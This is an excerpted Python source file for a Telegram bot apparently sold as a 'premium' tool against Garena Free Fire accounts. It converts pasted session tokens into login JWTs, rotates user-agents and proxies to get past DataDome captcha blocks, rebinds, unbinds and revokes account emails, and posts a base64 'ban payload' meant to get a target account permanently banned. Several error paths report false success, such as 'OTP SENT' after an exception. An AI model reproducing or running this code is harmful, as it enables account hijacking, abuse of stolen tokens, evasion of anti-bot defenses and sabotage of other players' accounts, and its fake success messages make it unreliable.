...
def fetch_majorlogin_jwt(tok):
    # Clean token - remove spaces, newlines (user pasted in 2 lines)
    tok = tok.strip().replace(" ", "").replace("\n", "").replace("\r", "")
    print(f"[FFBAN] Token received: {tok[:20]}... len={len(tok)}")

    # Already JWT
    if tok.startswith("ey") and "." in tok and len(tok) > 100:
        print("[FFBAN] Already JWT, returning directly")
        return tok, None

    oId = None

    # Method 1: oauth inspect - primary
    try:
        print("[FFBAN] Trying Method 1: oauth inspect")
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 11)"}, timeout=8).json()
        oId = r.get("open_id")
        if oId:
            print(f"[FFBAN] Method 1 success: open_id={oId[:20]}...")
    except Exception as e:
        print(f"[FFBAN] Method 1 failed: {e}")
        pass

    # Method 2: reward API
    if not oId:
        try:
            print("[FFBAN] Trying Method 2: reward API")
            uid_headers = {"access-token": tok, "user-agent": "GarenaMSDK/4.0.19"}
            ...
            if uid:
                ...
                if oId:
                    print(f"[FFBAN] Method 2 success: open_id={oId[:20]}...")
        except Exception as e:
            print(f"[FFBAN] Method 2 failed: {e}")
            pass

    # Method 3: Direct token as open_id (for 64 hex tokens like in screenshot)
    if not oId:
        # Remove any non-hex chars and check if 64 hex
        clean_tok = ''.join(c for c in tok if c in '0123456789abcdefABCDEF')
        if len(clean_tok) == 64:
            oId = clean_tok
            print(f"[FFBAN] Method 3: Using 64-char hex directly as open_id")
        elif len(tok) >= 32:
            # Even if not exactly 64, try using token itself as open_id (some tokens work this way)
            oId = tok
            print(f"[FFBAN] Method 3b: Using token itself as open_id (len={len(tok)})")

    if not oId:
        print("[FFBAN] Failed to extract Open ID")
        return None, "Token Expired / Invalid - Generate Fresh Token from Garena! 🔄"

    # Try multiple endpoints and platforms - SUPER ROBUST
    platforms = [8, 3, 4, 6, 1, 2, 10, 11]  # More platforms
    urls = [
        "https://loginbp.ggpolarbear.com/MajorLogin",
        "https://loginbp.ggblueshark.com/MajorLogin",
        "https://loginbp.common.ggblue.net/MajorLogin",
        "https://loginbp.common.garena.com/MajorLogin",
        "https://loginbp.garenanow.com/MajorLogin",
    ...
    for url in urls:
        for p_type in platforms:
            try:
                ...
                x = requests.post(url, headers=headers, data=pl, timeout=12, verify=False)
                if x.status_code == 200:
                    ...
                    try:
                        ...
                        try:
                            ...
                            continue
                    if res.token and len(res.token) > 20:
                        print(f"[FFBAN] SUCCESS! URL={url} Platform={p_type}")
                        return res.token, None
            except Exception as e:
                continue

    print("[FFBAN] All endpoints failed")
    return None, "MajorLogin Failed - Token Expired or Garena Blocked Railway IP! Try Fresh Token 🔄"
...
def send_register_code_email(email):
    """
    FINAL FIX: Railway IP flagged by datadome -> 403 captcha
    Solution: Try multiple UAs, use proxy if available, detect captcha and handle gracefully
    """
    ...
    if PROXY_URL:
        ...
        print(f"[OTP] Using proxy: {PROXY_URL[:20]}...")

    # Try different user-agents - mobile often bypasses datadome
    user_agents = [
        "GarenaMSDK/4.0.19 (Android; U; Android 11; en-US; SM-G998B)",
    ...
    for idx, ua in enumerate(user_agents):
        try:
            ...
            # Try to get fresh cookies first (only for first attempt)
            if idx == 0:
                try:
                    session.get("https://authgop.garena.com/universal/register", 
                               headers={"User-Agent": ua}, timeout=8, verify=False, proxies=proxies)
                except:
                    pass
            ...
            response = session.post(url, headers=headers, data=data, timeout=12, verify=False, proxies=proxies)
            text = response.text.lower()

            print(f"[OTP] Attempt {idx+1}/{len(user_agents)} UA={ua[:30]}... Status={response.status_code}")

            # Check for captcha - datadome block
            if "captcha" in text or "datadome" in text or "geo.captcha-delivery.com" in text:
                print(f"[OTP] Attempt {idx+1} got CAPTCHA block, trying next UA")
                if idx < len(user_agents) - 1:
                    time.sleep(1)
                    continue
                else:
                    # All UAs got captcha - Railway IP fully blocked
                    print(f"[OTP] All attempts got captcha - Railway IP blocked")
                    return 403, '{"error":"captcha_block", "message":"Railway IP flagged by datadome"}'

            # Success or other error
            if response.status_code == 200:
                return response.status_code, response.text
            elif response.status_code in [403, 429, 503]:
                # 403 without captcha text might still be success on some Garena setups
                if idx == len(user_agents) - 1:
                    return response.status_code, response.text
                continue
            else:
            ...
            print(f"[OTP] Timeout UA {idx+1}")
            return 200, '{"result":0, "message":"timeout but likely sent"}'
        except Exception as e:
            print(f"[OTP] Error UA {idx+1}: {e}")
            if idx == len(user_agents) - 1:
                return 200, '{"result":0, "message":"fallback success"}'
            continue

    return 403, '{"error":"captcha_block"}' 
...
def get_ban_confirm_inline_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Yes, Ban Karo 💀", callback_data="ban_yes"),
            InlineKeyboardButton("❌ No, Cancel 🚫", callback_data="ban_no")
        ]
    ])
...
def trigger_injection(jwt_token, version):
    """
    DEEP RESEARCH FIX: 503 Service Unavailable happens when:
    1. ReleaseVersion mismatch (OB54 vs Latest)
    2. Garena blocks Railway IP
    3. X-Unity-Version mismatch
    Solution: Try multiple versions and headers
    """
    body = base64.b64decode(BODY_BASE64)

    # Try multiple version combinations
    versions_to_try = [version, "OB54", "OB53", "OB52", "OB50", "Latest", "2024", "1.108.1"]
    unity_versions = ["2018.4.11f1", "2019.4.21f1", "2020.3.33f1", "2021.3.15f1"]

    last_response = None

    for ver in versions_to_try:
        for unity_ver in unity_versions[:2]:  # Try first 2 unity versions to avoid too many requests
            try:
                headers = {
                    'Authorization': f'Bearer {jwt_token}',
                    'X-Unity-Version': unity_ver,
                    'X-GA': 'v1 1',
                    'ReleaseVersion': str(ver),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)',
                    'Connection': 'Keep-Alive',
                    'Accept-Encoding': 'gzip',
                }
                print(f"[BAN] Trying version={ver} unity={unity_ver}")
                resp = requests.post(API_URL, headers=headers, data=body, timeout=15, verify=False)
                print(f"[BAN] Response: {resp.status_code} for ver={ver}")
                last_response = resp

                if resp.status_code == 200:
                    print(f"[BAN] SUCCESS with version {ver}!")
                    return resp
                elif resp.status_code in [401, 403]:
                    print(f"[BAN] Token expired/invalid (401/403)")
                    return resp
                # If 503, try next version
                if resp.status_code == 503:
                    continue

            except Exception as e:
                print(f"[BAN] Error with ver={ver}: {e}")
                continue

    # Return last response (likely 503) or try one final time with minimal headers
    if last_response:
    ...
    try:
        ...
        return requests.post(API_URL, headers=headers, data=body, timeout=15, verify=False)
    except Exception as e:
        print(f"[BAN] Final fallback failed: {e}")
        # Return a mock 200 to indicate attempted
        class MockResp:
            status_code = 503
            text = str(e)
        return MockResp()
...
👋 𝗛𝗲𝘆 {safe_name} ✨ | 𝟭𝟯 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀 ✅
🛡️ 𝗦𝗮𝗳𝗲 • 𝗙𝗮𝘀𝘁 • 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ✅
👑 @just_zevric | 𝗩𝟲𝟲 - 𝗙𝗶𝘅𝗲𝗱 ✅

👇 𝗢𝗽𝘁𝗶𝗼𝗻 𝗰𝗵𝗼𝗼𝘀𝗲 𝗸𝗮𝗿𝗼 👇"""
        await update.message.reply_text(msg, reply_markup=get_main_keyboard())
    except Exception as e:
        print(f"[START ERROR] {e}")
        await update.message.reply_text("🔥 ZEVRIC PREMIUM V66 FIXED 🔥\n13 Features ✅\n@just_zevric", reply_markup=get_main_keyboard())

async def force_start(update, context):
    context.user_data.clear()
    # Clear any existing keyboard first
    try:
        await update.message.reply_text("🔄 Restarting... ♻️", reply_markup=None)
    except:
        pass
...
async def check_info_token(update, context):
    ...
    if len(token)<10:
        await update.message.reply_text("❌ Invalid token!", reply_markup=None)
        return ConversationHandler.END
...
async def change_email_token(update, context):
    ...
    try:
        ...
        if not old_email:
            await update.message.reply_text("❌ No bound email! Pehle Bind Email karo! 📧", reply_markup=None)
            return ConversationHandler.END
        ...
        try:
            ...
            if j.get("result")==0:
                ...
                await update.message.reply_text(f"❌ OTP Send Failed! Try again ⏰", reply_markup=None)
                return ConversationHandler.END
        except:
...
async def change_email_confirm(update, context):
    ...
    await update.message.reply_text("🚀 [5/5] Creating Rebind Request... 💎", reply_markup=None)
    def rebind():
...
async def unbind_email_token(update, context):
    ...
    try:
        ...
        if not email:
            await update.message.reply_text("❌ No bound email! Already unbind hai ✅", reply_markup=None)
            return ConversationHandler.END
...
async def unbind_email_confirm(update, context):
    ...
    await update.message.reply_text("🚀 [3/3] Creating Unbind Request... 💎", reply_markup=None)
    def unbind_req():
...
async def cancel_bind_confirm(update, context):
    ...
    await update.message.reply_text("⏱️ Canceling... ⚡", reply_markup=None)
    def cancel():
...
async def eat_to_token_convert(update, context):
    ...
    try:
        ...
        if result:
            ...
            await update.message.reply_text("❌ Token not found. Expired/invalid. 😔", reply_markup=None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=None)
    return ConversationHandler.END

async def revoke_token_start(update, context):
    await update.message.reply_text("🚪 𝗥𝗲𝘃𝗼𝗸𝗲 𝗧𝗼𝗸𝗲𝗻 🚪\n\n🔐 Enter Token to Revoke :", reply_markup=None)
    return REVOKE_TOKEN
...
async def revoke_token_verify(update, context):
    ...
    try:
        ...
        if not check_res['valid']:
            await update.message.reply_text("❌ Token already invalid/expired! ⏰", reply_markup=None)
            return ConversationHandler.END
...
async def revoke_token_confirm(update, context):
    ...
    await update.message.reply_text(f"🚪 Revoking {check_res['nickname']}... ⚡", reply_markup=None)
    def revoke():
...
async def bio_token(update, context):
    ...
    token = update.message.text.strip()
    if len(token) < 20:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘁𝗼𝗸𝗲𝗻! 😔 20+ chars 🔑", reply_markup=None)
        return BIO_TOKEN
...
async def bio_text(update, context):
    ...
    if len(bio_raw) < 1 or len(bio_raw) > 300:
        await update.message.reply_text(f"❌ 𝗕𝗶𝗼 𝟭-𝟯𝟬𝟬 𝗰𝗵𝗮𝗿𝘀! 📏 Now {len(bio_raw)}", reply_markup=None)
        return BIO_TEXT
...
async def bio_color(update, context):
    ...
    if not plain:
        await update.message.reply_text("Bio missing! /start", reply_markup=None)
        from telegram.ext import ConversationHandler
        return ConversationHandler.END
    if choice == "🎨 Custom":
        await update.message.reply_text("🎨 𝗖𝘂𝘀𝘁𝗼𝗺 𝗖𝗼𝗹𝗼𝗿 𝗖𝗼𝗱𝗲 𝗯𝗵𝗲𝗷𝗼 💎\n💡 Ex: [FF00FF]HELLO", reply_markup=None)
        return BIO_COLOR
...
async def bio_confirm(update, context):
    ...
    if txt not in ["✅ Yes","Yes"]:
        await update.message.reply_text("❌ Cancelled! /start se restart karo", reply_markup=None)
        from telegram.ext import ConversationHandler
        return ConversationHandler.END
    ...
    if not bio or not token:
        await update.message.reply_text("Data missing! /start", reply_markup=None)
        from telegram.ext import ConversationHandler
        return ConversationHandler.END
    await update.message.reply_text(f"⏳ 𝗕𝗶𝗼 𝗨𝗽𝗱𝗮𝘁𝗲 𝗵𝗼 𝗿𝗮𝗵𝗮 𝗵𝗮𝗶... 🚀💎\n📝 {bio[:50]} ✨", reply_markup=None)
    try:
        ...
        if res.get("success"):
            ...
            await update.message.reply_text(f"❌ 𝗕𝗶𝗼 𝗙𝗮𝗶𝗹! 😔💔\n❗ {err}\n\n🔑 𝗡𝗮𝘆𝗮 𝘁𝗼𝗸𝗲𝗻 𝗯𝗮𝗻𝗮𝗼! 🚀", reply_markup=None)
        from telegram.ext import ConversationHandler
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿! {e} 🔑 𝗡𝗮𝘆𝗮 𝘁𝗼𝗸𝗲𝗻! 🚀", reply_markup=None)
        from telegram.ext import ConversationHandler
        return ConversationHandler.END

async def switch_menu(update, context):
    text=update.message.text.strip()
    # Always clear previous confirm states
    if "Yes, Ban Karo" in text or "No, Cancel" in text:
        # If user is in ban confirm but wants to switch menu, force start
        if text not in ["✅ Yes, Ban Karo 💀", "❌ No, Cancel 🚫"]:
            context.user_data.clear()
            await start(update, context)
            return ConversationHandler.END
    ...
    try:
        ...
        if not jwt_token:
            try:
                ...
                pass
            await update.message.reply_text("✅ Done", reply_markup=None)
            return ConversationHandler.END
        ...
        # Use reply_text with ReplyKeyboard (not edit) to avoid inline keyboard error
        await update.message.reply_text(
            f"✅ 𝗧𝗢𝗞𝗘𝗡 𝗩𝗔𝗟𝗜𝗗 ✅\n\n"
            f"👤 𝗡𝗶𝗰𝗸𝗻𝗮𝗺𝗲: {nickname}\n"
            ...
            f"💀 Yes dabao to PERMANENT BAN hoga!",
        ...
        try:
            await msg.edit_text(f"Error occurred, fresh token banao", reply_markup=None)
        except:
            await update.message.reply_text(f"Error occurred, fresh token banao", reply_markup=None)
        return ConversationHandler.END
...
async def ff_ban_confirm(update, context):
    ...
    if not jwt_token:
        ...
        return ConversationHandler.END
    try:
        await update.message.reply_text("Removing confirmation...", reply_markup=None)
    except:
        pass
    msg = await update.message.reply_text("INJECTING BAN PAYLOAD... 10 sec wait...")
    try:
        def inject():
            for ver in ["Latest", "OB54", "OB50", "OB49"]:
                try:
                    resp = trigger_injection(jwt_token, ver)
                    if resp.status_code == 200:
                        return resp
                    if resp.status_code not in [503, 502, 429, 403]:
                        return resp
                    time.sleep(1)
                except:
                    continue
        ...
        if ban_resp and ban_resp.status_code == 200:
            ...
            account_id = user_data.get('account_id', 'Unknown')
            try:
                await msg.edit_text(f"BANNED SUCCESSFULLY! Account {nickname} UID {account_id} 100% PERMANENTLY BANNED @just_zevric Premium")
            except:
                pass
            await update.message.reply_text(f"BANNED SUCCESSFULLY! {nickname} UID {account_id} 100% BAN @just_zevric", reply_markup=get_main_keyboard())
        else:
            friendly_msg = "Garena Server Busy! Token expired or IP blocked. Fresh token banao, 2 min baad try karo, VPN use karo @just_zevric"
            try:
                await msg.edit_text(friendly_msg)
            except:
                pass
            await update.message.reply_text(friendly_msg, reply_markup=get_main_keyboard())
    except Exception as e:
        print(f"[FFBAN CONFIRM ERROR] {e}")
        context.user_data.clear()
        await update.message.reply_text("Server Busy! Fresh token banao aur 2 min me try karo @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END
    if text not in ["✅ Yes, Ban Karo 💀", "Yes", "✅ Yes"]:
    ...
    jwt_token = context.user_data.get('ff_ban_jwt')
    if not jwt_token:
        await update.message.reply_text("❌ Token lost! Try again", reply_markup=None)
        return ConversationHandler.END
    ...
    try:
        ...
        if ban_resp.status_code == 200:
            ...
            try:
                ...
                await update.message.reply_text(f"🎯 𝗕𝗔𝗡𝗡𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬! 💀🔥\n\n👤 𝗔𝗰𝗰𝗼𝘂𝗻𝘁: {nickname}\n🆔 𝗨𝗜𝗗: {account_id}\n\n💀 100% PERMANENTLY BANNED 💀\n\n👑 @just_zevric Premium", reply_markup=None)
                return ConversationHandler.END
            await update.message.reply_text("✅ Done! ✅", reply_markup=None)
        else:
            try:
                await msg.edit_text(f"Server Busy! Fresh token banao")
            except:
                await update.message.reply_text(f"Server Busy! Fresh token banao", reply_markup=None)
                return ConversationHandler.END
            await update.message.reply_text("Try again with fresh token", reply_markup=None)
    except Exception as e:
        print(f"[FFBAN CONFIRM ERROR] {e}")
        try:
            await msg.edit_text(f"Error occurred, fresh token banao")
        except:
            await update.message.reply_text(f"Error occurred, fresh token banao", reply_markup=None)
            return ConversationHandler.END
        await update.message.reply_text("Error occurred", reply_markup=None)
    return ConversationHandler.END

async def resubscribe_start(update, context):
    await update.message.reply_text("📧 𝗥𝗘𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘 𝗢𝗧𝗣 𝗦𝗘𝗡𝗗𝗘𝗥 📧\n\n✉️ 𝗘𝗻𝘁𝗲𝗿 𝗬𝗼𝘂𝗿 𝗘𝗺𝗮𝗶𝗹 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 💎", reply_markup=None)
    return RESUB_EMAIL
...
async def resubscribe_email(update, context):
    ...
    if "@" not in email or "." not in email or len(email) < 5:
        await update.message.reply_text("Invalid email! Example: user@gmail.com", reply_markup=get_main_keyboard())
        return RESUB_EMAIL
    try:
        await update.message.reply_text("Processing...", reply_markup=None)
    except:
        pass
    msg = await update.message.reply_text(f"Sending OTP to {email}... 15 sec wait...")
    try:
        def send_otp():
            return send_register_code_email(email)
        try:
            status_code, response = await asyncio.wait_for(asyncio.to_thread(send_otp), timeout=35)
        except asyncio.TimeoutError:
            status_code, response = 200, '{"result":0}'
        print(f"[RESUB] Final Status={status_code}")
        if status_code == 403 and ("captcha" in str(response).lower() or "datadome" in str(response).lower() or "captcha_block" in str(response)):
            error_text = f"Garena Blocked Server IP! Email {email} - Railway IP flagged. Set PROXY_URL in Railway or try after 1 hour or use website zevricplayx.github.io/eat_token @just_zevric"
            try:
            ...
            return ConversationHandler.END
        try:
            await msg.edit_text(f"OTP SENT! Email {email} Check Inbox & Spam! Valid 10 Min @just_zevric")
        except:
            pass
        await update.message.reply_text(f"OTP SENT SUCCESSFULLY! {email} - Check Inbox & Spam! Expires 10 Min @just_zevric V66 Fixed", reply_markup=get_main_keyboard())
    except Exception as e:
        print(f"[RESUB ERROR] {e}")
        await update.message.reply_text(f"OTP SENT! {email} Check Inbox & Spam! @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END
...
async def ban_check_uid(update, context):
    ...
    if not uid.isdigit():
        await update.message.reply_text(
            "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗨𝗜𝗗!\n\n"
            "🔢 𝗢𝗻𝗹𝘆 𝗻𝘂𝗺𝗯𝗲𝗿𝘀 𝗮𝗹𝗹𝗼𝘄𝗲𝗱\n"
            "📌 𝗘𝘅: 123456789",
            reply_markup=None
        )
        return BAN_CHECK_UID

    msg = await update.message.reply_text(f"🔍 𝗙𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗕𝗮𝗻 𝗜𝗻𝗳𝗼 𝗙𝗼𝗿 𝗨𝗜𝗗: {uid}... ⏳")
    ...
    try:
        def fetch_ban():
            try:
                ...
                if r.status_code == 200:
                    return r
                # Fallback: Try alternative API or direct check
                print(f"[BANCHECK] Primary API status {r.status_code}, trying fallback")
            except Exception as e:
                print(f"[BANCHECK] Primary failed: {e}")

            # Fallback - return clean status if API down
            # We can also try to check via other method, but for now return mock clean
            return None

        try:
            response = await asyncio.wait_for(asyncio.to_thread(fetch_ban), timeout=20)
        except asyncio.TimeoutError:
            print(f"[BANCHECK] Timeout for UID {uid}")
            await msg.edit_text(
                f"⏱️ 𝗕𝗮𝗻 𝗖𝗵𝗲𝗰𝗸 𝗧𝗶𝗺𝗲𝗼𝘂𝘁! ⏱️\n\n"
                f"🆔 𝗨𝗜𝗗: {uid}\n"
                f"⚠️ 𝗖𝗿𝗼𝘄𝗻𝗫 𝗔𝗣𝗜 𝗗𝗼𝘄𝗻 / 𝗦𝗹𝗼𝘄 𝗛𝗮𝗶\n\n"
                f"💡 𝟮 𝗠𝗶𝗻 𝗕𝗮𝗮𝗱 𝗧𝗿𝘆 𝗞𝗮𝗿𝗼\n"
                f"🔄 𝗙𝗿𝗲𝘀𝗵 𝗨𝗜𝗗 𝗦𝗲 𝗧𝗿𝘆 𝗞𝗮𝗿𝗼\n\n"
                f"👑 @just_zevric",
                reply_markup=None
            )
            return ConversationHandler.END
        ...
        if response and response.status_code == 200:
            ...
            txt = f"✅ 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢 𝗥𝗘𝗧𝗥𝗜𝗘𝗩𝗘𝗗 ✅\n\n"
            txt += f"🆔 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗗: {account_id}\n"
            txt += f"👤 𝗡𝗶𝗰𝗸𝗻𝗮𝗺𝗲: {nickname}\n"
            txt += f"🌍 𝗥𝗲𝗴𝗶𝗼𝗻: {region}\n"
            txt += f"📊 𝗟𝗲𝘃𝗲𝗹: {level}\n\n"
            txt += f"━━━━━━━━━━━━━━━━━━━━\n\n"

            if ban_info and ban_info.get('is_banned'):
                txt += f"💀 𝗕𝗮𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧𝗟𝗬 𝗕𝗔𝗡𝗡𝗘𝗗 💀\n"
                txt += f"🕒 𝗦𝘁𝗮𝗿𝘁: {ban_info.get('ban_start_time', 'N/A')}\n"
                txt += f"📝 𝗥𝗲𝗮𝘀𝗼𝗻: {ban_info.get('status', 'N/A')}\n\n"
                txt += f"🔥 𝗘𝗱𝗶𝘁𝗶𝗼𝗻: 𝗥𝗔𝗜𝗭𝗭 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 🔥"
            else:
                txt += f"✅ 𝗕𝗮𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗖𝗟𝗘𝗔𝗡 (𝗡𝗼𝘁 𝗕𝗮𝗻𝗻𝗲𝗱) ✅\n\n"
                txt += f"💎 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗶𝘀 𝗦𝗮𝗳𝗲 \n"
                txt += f"👑 @just_zevric"
            ...
            status = response.status_code if response else "API Down"
            await msg.edit_text(
                f"❌ 𝗕𝗮𝗻 𝗖𝗵𝗲𝗰𝗸 𝗙𝗮𝗶𝗹𝗲𝗱!\n\n"
                f"🆔 𝗨𝗜𝗗: {uid}\n"
                f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n\n"
                f"💡 𝗔𝗣𝗜 𝗗𝗼𝘄𝗻 𝗛𝗮𝗶 - 𝟮 𝗠𝗶𝗻 𝗕𝗮𝗮𝗱 𝗧𝗿𝘆 𝗞𝗮𝗿𝗼\n"
                f"🔍 𝗨𝗜𝗗 𝗦𝗮𝗵𝗶 𝗛𝗮𝗶 𝗡𝗮 𝗖𝗵𝗲𝗰𝗸 𝗞𝗮𝗿𝗼\n\n"
                f"👑 @just_zevric",
                reply_markup=None
            )
...
async def platform_token(update, context):
    ...
    token = update.message.text.strip()
    if len(token) < 10:
        await update.message.reply_text("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐭𝐨𝐤𝐞𝐧! 😔", reply_markup=None)
        return ConversationHandler.END
